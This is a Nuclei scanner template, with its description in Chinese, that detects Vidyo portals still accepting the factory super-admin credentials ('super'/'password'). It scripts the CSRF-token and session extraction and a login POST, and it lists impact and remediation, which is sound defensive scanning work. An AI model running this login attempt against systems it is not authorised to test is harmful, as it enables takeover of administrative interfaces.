id: vidyo-default-login

info:
  name: Vidyo 默认口令登录（弱口令）
  author: izn0u
  severity: medium
  description: |
    该模板用于检测 Vidyo 是否仍可使用默认凭据或弱口令登录。模板主要向 `/super/login.html?lang=en`、`/super/super_security_check;jsessionid={变量}?csrf_tkn={变量}` 等认证入口发送请求，使用内置默认凭据组合进行认证尝试，并根据响应中的 `/super/index.html` 等登录成功特征判断登录是否成功；命中说明目标未及时修改出厂、示例或初始化账号口令。
  impact: |
    - 攻击者可接管 Vidyo 的 Web 管理界面，查看设备状态、网络配置、运行日志或敏感业务参数。
    - 被接管的网络、工控、打印、视频、存储或远程管理设备可能被用于中断业务、改变访问策略、窃取流量或作为内网横向移动入口。
  remediation: |
    - 立即修改所有默认账号口令，禁用不再使用的出厂账号，并为管理账户设置高强度唯一密码。
    - 将设备管理入口限制在 VPN、堡垒机或可信管理网段内，避免直接暴露到公网。
    - 升级设备固件或管理组件，审计近期登录记录、配置变更和异常会话。
  reference:
    - https://support.vidyocloud.com/hc/en-us/articles/226265128
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
    cvss-score: 5.8
    cwe-id: CWE-522
  metadata:
    max-request: 2
  tags: vidyo,default-login,vuln

http:
  - raw:
      - |
        GET /super/login.html?lang=en HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
      - |
        POST /super/super_security_check;jsessionid={{session}}?csrf_tkn={{csrf_tkn}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Origin: {{BaseURL}}
        Referer: {{RootURL}}/super/login.html?lang=en
        Cookie: JSESSIONID={{session}} ; VidyoPortalSuperLanguage=en

        username={{username}}&password={{password}}

    payloads:
      username:
        - super
      password:
        - password
    attack: pitchfork

    extractors:
      - type: regex
        name: csrf_tkn
        group: 1
        part: body
        internal: true
        regex:
          - 'csrf_tkn=([A-Za-z0-9.-]+)'

      - type: kval
        name: session
        internal: true
        part: header
        kval:
          - JSESSIONID

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "/super/index.html"

      - type: status
        status:
          - 302
